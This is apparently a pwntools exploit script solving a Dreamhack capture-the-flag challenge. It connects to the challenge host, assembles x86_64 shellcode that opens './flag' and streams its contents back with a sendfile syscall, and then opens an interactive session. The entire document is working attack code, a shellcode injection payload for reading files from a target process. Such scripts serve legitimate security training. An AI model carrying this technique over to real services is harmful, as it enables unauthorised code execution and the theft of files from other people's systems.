from pwn import *
context.arch = 'x86_64'
p = remote('host8.dreamhack.games', 10818)

shellcode = ''
shellcode += shellcraft.openat(-100, './flag', 0)
shellcode += '''
    mov r8, rax

    /* sendfile(1, fd, NULL, 0x1000) */
    mov rax, 40        /* SYS_sendfile */
    mov rdi, 1         /* out_fd = stdout */
    mov rsi, r8        /* in_fd = openat으로 얻은 fd */
    xor rdx, rdx       /* offset = NULL */
    mov r10, 0x1000    /* count */
    syscall
'''
shellcode += shellcraft.exit(0)

p.sendline(asm(shellcode))

p.interactive()